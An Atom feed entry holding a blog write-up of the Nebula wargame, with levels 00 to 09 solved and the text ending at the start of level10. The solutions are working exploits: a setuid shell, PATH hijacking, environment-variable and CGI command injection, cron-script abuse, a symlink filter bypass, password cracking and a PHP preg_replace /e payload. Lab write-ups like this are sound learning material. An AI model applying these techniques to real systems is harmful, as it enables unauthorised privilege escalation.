<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: ctf | #!/slash/note]]></title>
  <link href="http://leonjza.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://leonjza.github.io/"/>
  <updated>2015-05-28T19:47:58+02:00</updated>
  <id>http://leonjza.github.io/</id>
  <author>
    <name><![CDATA[Leon Jacobs]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[playing exploit-exercises - nebula]]></title>
    <link href="http://leonjza.github.io/blog/2015/05/09/playing-exploit-exercises-nebula/"/>
    <updated>2015-05-09T07:18:31+02:00</updated>
    <id>http://leonjza.github.io/blog/2015/05/09/playing-exploit-exercises-nebula</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p>Recently I decided I wanted to have a look at what <a href="https://exploit-exercises.com/">Exploit Exercises</a> had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for <a href="https://exploit-exercises.com/nebula/">Nebula</a>. <em>Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.</em></p>

<p><img class="<a" src="href="https://i.imgur.com/6K9zeta.jpg">https://i.imgur.com/6K9zeta.jpg</a>"></p>

<p>I did not really have a lot of time on my hands and figured I should start with the &ldquo;easy&rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)</p>

<p>This is the path I took to solve the 20 challenges.</p>

<!-- more -->


<h2>setup</h2>

<p>On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.</p>

<p>After my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:</p>

<p><code>bash
~ » ssh level00@192.168.217.239
no hostkey alg
</code></p>

<p><em>sigh</em>. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the <code>nebula</code> account to root and generated a RSA host key with: <code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code> with no password. I was now able to log in:</p>

<p>```text
~ » ssh <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x6c;&#x65;&#x76;&#101;&#x6c;&#x30;&#x30;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#49;&#x37;&#46;&#50;&#x33;&#x39;">&#x6c;&#x65;&#x76;&#101;&#108;&#x30;&#48;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#49;&#55;&#x2e;&#50;&#x33;&#x39;</a>
The authenticity of host &lsquo;192.168.217.239 (192.168.217.239)&rsquo; can&rsquo;t be established.
RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.217.239&rsquo; (RSA) to the list of known hosts.</p>

<pre><code>  _   __     __          __
 / | / /__  / /_  __  __/ /___ _
/  |/ / _ \/ __ \/ / / / / __ `/
</code></pre>

<p>   / /|  /  <strong>/ /<em>/ / /</em>/ / / /<em>/ /
  /</em>/ |_/_</strong>/<em>.</em><em><em>/_</em>,</em>/<em>/_</em>,_/</p>

<pre><code>exploit-exercises.com/nebula
</code></pre>

<p>For level descriptions, please see the above URL.</p>

<p>To log in, use the username of &ldquo;levelXX&rdquo; and password &ldquo;levelXX&rdquo;, where
XX is the level number.</p>

<p>Currently there are 20 levels (00 &ndash; 19).</p>

<p><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#108;&#101;&#118;&#x65;&#x6c;&#48;&#48;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x32;&#x31;&#55;&#46;&#50;&#51;&#x39;">&#x6c;&#101;&#118;&#101;&#x6c;&#x30;&#48;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#50;&#x31;&#x37;&#x2e;&#x32;&#51;&#57;</a>&rsquo;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a>
New release &lsquo;12.04 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</li>
</ul>


<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>level00@nebula:~$
```</p>

<p>I could see that I was now logged in as level00</p>

<p><code>bash
level00@nebula:~$ id
uid=1001(level00) gid=1001(level00) groups=1001(level00)
</code></p>

<p>The challenges are all in their respective <code>flag</code> folder. So if you are logged in as <code>level00</code>, you are interested in <code>flag00</code>. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command <code>getflag</code> could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running <code>getflag</code> is enough to consider a level done. I had prepared a small C setuid shell in <code>/var/tmp/shell.c</code> with the following output:</p>

<p>```c</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}
```
This shell was reused throughout the challenges. Lets dig into the challenges themselves.</p>

<h2>level00</h2>

<p><a href="https://exploit-exercises.com/nebula/level00/">Level00&rsquo;s Description</a>:
<blockquote><p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p></blockquote></p>

<p>Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know <em>about</em> SUID binaries :P</p>

<p>So, to solve level00:</p>

<p>```bash
level00@nebula:~$ find / -perm -4000 2> /dev/null | xargs ls -lh
-rwsr-x&mdash;&ndash; 1 flag00  level00    7.2K 2011-11-20 21:22 /bin/&hellip;/flag00
-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /bin/fusermount
-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /bin/mount
-rwsr-xr-x 1 root    root        34K 2011-05-03 03:38 /bin/ping
-rwsr-xr-x 1 root    root        39K 2011-05-03 03:38 /bin/ping6
-rwsr-xr-x 1 root    root        31K 2011-06-24 02:37 /bin/su
-rwsr-xr-x 1 root    root        63K 2011-08-09 09:15 /bin/umount
-rwsr-x&mdash;&ndash; 1 flag00  level00    7.2K 2011-11-20 21:22 /rofs/bin/&hellip;/flag00
-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /rofs/bin/fusermount
-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /rofs/bin/mount
[&hellip;]</p>

<p>level00@nebula:~$ /bin/&hellip;/flag00
Congrats, now run getflag to get your flag!</p>

<p>flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level01</h2>

<p><a href="https://exploit-exercises.com/nebula/level01/">Level01&rsquo;s Description</a>:
<blockquote><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level1.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  system(&ldquo;/usr/bin/env echo and now what?&rdquo;);
}
```</p>

<p>We can see a bunch of UID/GID stuff being set with with <code>setresgid</code> and <code>setresuid</code> and then a system command being run with <code>system()</code>. The problem lies in the fact that the command that is being run does not have a full path specified for the <code>echo</code> command. Even though its called with <code>/usr/bin/env</code>, it is possible to modify the current <code>PATH</code> variable and have <code>env</code> report echo as being somewhere other than where it would normally be.</p>

<p>On the filesystem we find the <code>flag01</code> binary and can see it is setuid for <code>flag01</code> user (we are currently logged in as <code>level01</code>):</p>

<p>```bash
level01@nebula:~$ cd ~flag01/
level01@nebula:/home/flag01$ ls -lh flag01
-rwsr-x&mdash;&ndash; 1 flag01 level01 7.2K 2011-11-20 21:22 flag01</p>

<p>level01@nebula:/home/flag01$ ./flag01
and now what?
```</p>

<p>Abusing this is really easy. I decided to create my own <code>echo</code> binary and modified <code>PATH</code> so that it is called instead of the real <code>echo</code>. A small note here though. The Nebula vm has <code>/tmp</code> mounted with the <code>nosuid</code> option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being <code>/var/tmp</code> was not mounted separately and I had write access there :)</p>

<p>```bash
level01@nebula:/home/flag01$ mount | grep &ldquo;/tmp&rdquo;
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)</p>

<p>level01@nebula:/home/flag01$ ls -lah /var/ | grep tmp
drwxrwxrwt 3 root root   29 2012-08-23 18:46 tmp
```</p>

<p>So, to solve level01:</p>

<p>```bash
level01@nebula:/home/flag01$ cat /var/tmp/echo</p>

<h1>!/bin/sh</h1>

<p>gcc /var/tmp/shell.c -o /var/tmp/flag01
chmod 4777 /var/tmp/flag01</p>

<p>level01@nebula:/home/flag01$ ls -lh /var/tmp/echo
-rwxrwxr-x 1 level01 level01 77 2015-05-08 07:35 /var/tmp/echo</p>

<p>level01@nebula:/home/flag01$ cat /var/tmp/shell.c</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}</p>

<p>level01@nebula:/home/flag01$ export PATH=/var/tmp:$PATH
level01@nebula:/home/flag01$ ./flag01
level01@nebula:/home/flag01$ ls -lah /var/tmp/flag01
-rwsrwxrwx 1 flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01</p>

<p>level01@nebula:/home/flag01$ /var/tmp/flag01
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level02</h2>

<p><a href="https://exploit-exercises.com/nebula/level02/">Level02&rsquo;s Description</a>:
<blockquote><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level2.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char *buffer;</p>

<p>  gid_t gid;
  uid_t uid;</p>

<p>  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  buffer = NULL;</p>

<p>  asprintf(&amp;buffer, &ldquo;/bin/echo %s is cool&rdquo;, getenv(&ldquo;USER&rdquo;));
  printf(&ldquo;about to call system(\&rdquo;%s\&ldquo;)\n&rdquo;, buffer);</p>

<p>  system(buffer);
}
```</p>

<p>Level02 is very similar to Level01, except for that fact that here the line <code>/bin/echo %s is cool</code> is copied to <code>buffer</code> and eventually put through a <code>system()</code> call. The value of the current environment variable <code>USER</code> is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (<em>is cool</em> in this case).</p>

<p>So, to solve level02:</p>

<p>```bash
level02@nebula:/home/flag02$ ./flag02
about to call system(&ldquo;/bin/echo level02 is cool&rdquo;)
level02 is cool</p>

<p>level02@nebula:/home/flag02$ USER=&ldquo;bob&rdquo; &amp;&amp; ./flag02
about to call system(&ldquo;/bin/echo bob is cool&rdquo;)
bob is cool</p>

<p>level02@nebula:/home/flag02$ cat /var/tmp/shell.c</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}</p>

<p>level02@nebula:/home/flag02$ USER=&ldquo;bob; id;#&rdquo; &amp;&amp; ./flag02
about to call system(&ldquo;/bin/echo bob; id;# is cool&rdquo;)
bob
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)</p>

<p>level02@nebula:/home/flag02$ USER=&ldquo;bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#&rdquo; &amp;&amp; ./flag02
about to call system(&ldquo;/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool&rdquo;)
bob</p>

<p>level02@nebula:/home/flag02$ /var/tmp/flag02
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level03</h2>

<p><a href="https://exploit-exercises.com/nebula/level03/">Level03&rsquo;s Description</a>:
<blockquote><p>Check the home directory of flag03 and take note of the files there.<br/>There is a crontab that is called every couple of minutes.</p></blockquote></p>

<p>Logging in as <code>level03</code>, we find a directory and a <code>sh</code> script:</p>

<p>```bash
level03@nebula:~$ cd ~flag03
level03@nebula:/home/flag03$ ls -lh
total 512
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh</p>

<p>level03@nebula:/home/flag03$ cat writable.sh</p>

<h1>!/bin/sh</h1>

<p>for i in /home/flag03/writable.d/* ; do</p>

<pre><code>(ulimit -t 5; bash -x "$i")
rm -f "$i"
</code></pre>

<p>done
```</p>

<p>With the mention of a cronjob, I assumed the <code>writable.sh</code> script was being run. From the source of the script we can see that everything in <code>/home/flag03/writable.d/</code> will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using <code>bash -x</code>. Once done, the file is removed. Easy to exploit.</p>

<p>So, to solve level03:</p>

<p>```bash
level03@nebula:/home/flag03$ vim /var/tmp/flag03.sh
level03@nebula:/home/flag03$ cat /var/tmp/flag03.sh</p>

<h1>!/bin/sh</h1>

<p>gcc /var/tmp/shell.c -o /var/tmp/flag03
chmod 4777 /var/tmp/flag03</p>

<p>level03@nebula:/home/flag03$ cat /var/tmp/shell.c</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}</p>

<p>level03@nebula:/home/flag03$ cp /var/tmp/flag03.sh /home/flag03/writable.d/</p>

<p>level03@nebula:/home/flag03$ # wait some time for the cronjob</p>

<p>level03@nebula:/home/flag03$ /var/tmp/flag03
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level04</h2>

<p><a href="https://exploit-exercises.com/nebula/level04/">Level04&rsquo;s Description</a>:
<blockquote><p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level4.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char buf[1024];
  int fd, rc;</p>

<p>  if(argc == 1) {</p>

<pre><code>  printf("%s [file to read]\n", argv[0]);
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  if(strstr(argv[1], &ldquo;token&rdquo;) != NULL) {</p>

<pre><code>  printf("You may not access '%s'\n", argv[1]);
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {</p>

<pre><code>  err(EXIT_FAILURE, "Unable to open %s", argv[1]);
</code></pre>

<p>  }</p>

<p>  rc = read(fd, buf, sizeof(buf));</p>

<p>  if(rc == -1) {</p>

<pre><code>  err(EXIT_FAILURE, "Unable to read fd %d", fd);
</code></pre>

<p>  }</p>

<p>  write(1, buf, rc);
}
```</p>

<p>From the snippet we can see that a check is in place for the first argument to see if the string <code>token</code> exists in it. As the token we want to read is actually called <em>token</em> this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.</p>

<p>So, to solve level04:</p>

<p>```bash
level04@nebula:/home/flag04$ ln -s /home/flag04/token /var/tmp/flag04
level04@nebula:/home/flag04$ ./flag04 /var/tmp/flag04
06508b5e-8909-4f38-b630-fdb148a848a2</p>

<p>level04@nebula:/home/flag04$ su &ndash; flag04
Password:
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level05</h2>

<p><a href="https://exploit-exercises.com/nebula/level05/">Level05&rsquo;s Description</a>:
<blockquote><p>Check the flag05 home directory. You are looking for weak directory permissions</p></blockquote></p>

<p>Browsing to the <code>flag05</code> directory we can see a <code>.backup</code> directory containing a tar archive that is readable. This archive contained a private key that allowed login as the <code>flag05</code> user.</p>

<p>So, to solve level05:</p>

<p>```bash
level05@nebula:~$ cd ~flag05
level05@nebula:/home/flag05$ ls -lah
total 5.0K
drwxr-x&mdash;&ndash; 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     220 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r&mdash;r&mdash; 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r&mdash;r&mdash; 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
-rw-r&mdash;r&mdash; 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx&mdash;&mdash;&mdash; 2 flag05 flag05    70 2011-11-20 20:13 .ssh</p>

<p>level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -lah
total 2.0K
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x&mdash;&ndash; 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r&mdash; 1 flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz</p>

<p>level05@nebula:/home/flag05/.backup$ tar -xvf backup-19072011.tgz -C /var/tmp/
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys</p>

<p>level05@nebula:/home/flag05/.backup$ ssh -i /var/tmp/.ssh/id_rsa <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x66;&#108;&#97;&#x67;&#x30;&#x35;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#49;">&#x66;&#108;&#x61;&#103;&#x30;&#53;&#x40;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#49;</a>
The authenticity of host &lsquo;127.0.0.1 (127.0.0.1)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;127.0.0.1&rsquo; (ECDSA) to the list of known hosts.</p>

<p>[&hellip;]</p>

<p>flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level06</h2>

<p><a href="https://exploit-exercises.com/nebula/level05/">Level06&rsquo;s Description</a>:
<blockquote><p>The flag06 account credentials came from a legacy unix system.</p></blockquote></p>

<p>Legacy unix system? This immediately had me thinking that the password hash may be in <code>/etc/passwd</code>. Older unix systems used to store passwords this way, but that is no longer the case.</p>

<p><code>bash
level06@nebula:~$ cat /etc/passwd| grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
</code></p>

<p>The hash <code>ueqwOCnSGdsuM</code> is something that I had to send to <code>john</code> to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P</p>

<p>```bash
~ # cat hash
ueqwOCnSGdsuM</p>

<p>~ # john hash
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello            (?)
guesses: 1  time: 0:00:00:00 DONE (Fri May  8 17:29:20 2015)  c/s: 102400  trying: 123456 &ndash; Pyramid
Use the &ldquo;&mdash;show&rdquo; option to display all of the cracked passwords reliably
```</p>

<p>The password is <code>hello</code>.
So, to solve level06:</p>

<p><code>bash
level06@nebula:~$ su - flag06
Password:
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level07</h2>

<p><a href="https://exploit-exercises.com/nebula/level07/">Level07&rsquo;s Description</a>:
<blockquote><p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p></blockquote></p>

<p>With the description we are provided with the source code of a small Perl program:</p>

<p>```perl index.cgi</p>

<h1>!/usr/bin/perl</h1>

<p>use CGI qw{param};</p>

<p>print &ldquo;Content-type: text/html\n\n&rdquo;;</p>

<p>sub ping {
  $host = $_[0];</p>

<p>  print(&ldquo;<html><head><title>Ping results</title></head><body><pre>&rdquo;);</p>

<p>  @output = <code>ping -c 3 $host 2&gt;&amp;1</code>;
  foreach $line (@output) { print &ldquo;$line&rdquo;; }</p>

<p>  print(&ldquo;</pre></body></html>&rdquo;);</p>

<p>}</p>

<h1>check if Host set. if not, display normal page, etc</h1>

<p>ping(param(&ldquo;Host&rdquo;));
```</p>

<p>This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the <code>flag07</code> directory one can see a <code>thttpd.conf</code> file which contains the port of the webserver serving this script on.</p>

<p>```bash
level07@nebula:/home/flag07$ grep port thttpd.conf</p>

<h1>Specifies an alternate port number to listen on.</h1>

<p>port=7007</p>

<h1>all hostnames supported on the local machine. See thttpd(8) for details.</h1>

<p>```</p>

<p>Exploiting the vulnerability simply meant that we have to inject commands into the <code>Host</code> parameter. I normally use python&rsquo;s urllib to ensure that fields are properly url encoded etc.</p>

<p>So, to solve level07:</p>

<p>```bash
~ » curl -v &ldquo;<a href="http://192.168.217.239:7007/index.cgi?$">http://192.168.217.239:7007/index.cgi?$</a>(python -c &lsquo;import urllib; print urllib.urlencode({ "Host&rdquo; : &ldquo;127.0.0.1 &amp;&amp; gcc /var/tmp/shell.c -o /var/tmp/flag07 &amp;&amp; chmod 4777 /var/tmp/flag07&rdquo; })&rsquo;)&ldquo;
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239&hellip;
* Connected to 192.168.217.239 (192.168.217.239) port 7007 (#0)</p>

<blockquote><p>GET /index.cgi?Host=127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1
User-Agent: curl/7.37.1
Host: 192.168.217.239:7007
Accept: <em>/</em></p>

<ul>
<li>HTTP 1.0, assume close after body
&lt; HTTP/1.0 200 OK
&lt; Content-type: text/html
&lt;
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.022 ms</li>
</ul>
</blockquote>

<p>&mdash;&ndash; 127.0.0.1 ping statistics &mdash;&ndash;
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.011/0.018/0.023/0.007 ms
* Closing connection 0
</pre></body></html>
```</p>

<p>And finally back on the NebulaVM after this curl from my host:</p>

<p><code>bash
level07@nebula:/home/flag07$ /var/tmp/flag07
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level08</h2>

<p><a href="https://exploit-exercises.com/nebula/level08/">Level08&rsquo;s Description</a>:
<blockquote><p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p></blockquote></p>

<p>Logging in as the user <code>level08</code> reveals a pcap in the <code>flag08</code> directory:</p>

<p>```bash
level08@nebula:~$ cd ~flag08
level08@nebula:/home/flag08$ ls
capture.pcap</p>

<p>level08@nebula:/home/flag08$ file capture.pcap
capture.pcap: tcpdump capture file (little-endian) &ndash; version 2.4 (Ethernet, capture length 65535)
```</p>

<p>I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:</p>

<p><img class="<a" src="href="https://i.imgur.com/Xc6IIbX.png">https://i.imgur.com/Xc6IIbX.png</a>"></p>

<p>Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the <code>level8</code> account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.</p>

<p><img class="<a" src="href="https://i.imgur.com/CWAERLv.png">https://i.imgur.com/CWAERLv.png</a>"></p>

<p><code>F7</code> according to the ASCII table is a backspace. That makes this easy :) Considering we have the password <code>backdoor...00Rm8.ate</code>, substituting the dot with backspaces we end up with <code>backd00Rmate</code> as the password.</p>

<p>So, to solve level08:</p>

<p>```bash
level08@nebula:/home/flag08$ su &ndash; flag08
Password:</p>

<p>flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level09</h2>

<p><a href="https://exploit-exercises.com/nebula/level09/">Level09&rsquo;s Description</a>:
<blockquote><p>There’s a C setuid wrapper for some vulnerable PHP code…</p></blockquote></p>

<p>With the description we are provided with the source code of a small PHP program:</p>

<p>```php level9.php
&lt;?php</p>

<p>function spam($email)
{
  $email = preg_replace(&ldquo;/./&rdquo;, &ldquo; dot &rdquo;, $email);
  $email = preg_replace(&ldquo;/@/&rdquo;, &ldquo; AT &rdquo;, $email);</p>

<p>  return $email;
}</p>

<p>function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);</p>

<p>  $contents = preg_replace(&ldquo;/([email (.*)])/e&rdquo;, &ldquo;spam(\&rdquo;\2\&ldquo;)&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/[/&rdquo;, &ldquo;&lt;&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/]/&rdquo;, &ldquo;>&rdquo;, $contents);</p>

<p>  return $contents;
}</p>

<p>$output = markup($argv[1], $argv[2]);</p>

<p>print $output;</p>

<p>?>
```</p>

<p>In the <code>flag09</code> directory, we have the above PHP sample as well as a SUID binary.</p>

<p><code>bash
level09@nebula:~$ cd ~flag09
level09@nebula:/home/flag09$ ls -lh
total 8.0K
-rwsr-x--- 1 flag09 level09 7.1K 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
</code></p>

<p>At first I managed to solve this one really fast. When <code>flag09</code> is invoked with <code>-h</code>, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:</p>

<p>```bash
level09@nebula:/home/flag09$ ./flag09 -a
Interactive shell</p>

<p>php > system(&ldquo;id&rdquo;);
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
```</p>

<p>With this I would have been able to prepare the small <code>flag09</code> setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.</p>

<p>The PHP code basically had 2 main functions. <code>markup()</code> and <code>spam()</code>. <code>markup()</code> would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching <code>[email addr]</code> where <em>addr</em> will be the extracted part. It then as a callback executes <code>spam()</code> which will convert <code>.</code> to <code>dot</code> and <code>@</code> to <code>AT</code>. I took a really long time researching the <code>preg_replace()</code> functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when <code>preg_replace()</code> is called with the <code>e</code> modifier. <a href="http://www.madirish.net/402">This</a> blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">here</a> helps develop a payload for exploitation. The PHP documentation has a sample of <code>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;</code> which is what I used to finish the final payload for this level.</p>

<p>Another thing to note about the PHP code is the <code>$use_me</code> variable passed to the <code>markup()</code> function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)</p>

<p>So, to solve level09:</p>

<p>```bash
level09@nebula:/home/flag09$ echo -ne &ldquo;[email {\${system(\$use_me)}}]&rdquo; > /var/tmp/flag09.txt</p>

<p>level09@nebula:/home/flag09$ cat /var/tmp/flag09.txt
[email {${system($use_me)}}]</p>

<p>level09@nebula:/home/flag09$ ./flag09 /var/tmp/flag09.txt &ldquo;gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09&rdquo;
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1</p>

<p>level09@nebula:/home/flag09$ /var/tmp/flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h3>intermission</h3>

<p>From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)</p>

<p>I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
Lets get to them!</p>

<h2>level10</h2>

<p><a href="https://exploit-exercises.com/nebula/level10/">Level10&rsquo;s Description</a>:
<blockquote><p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p></blockquote></p>

<p>With the description we are provided with the source code of a small PHP program:</p>

<p>```c basic.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>
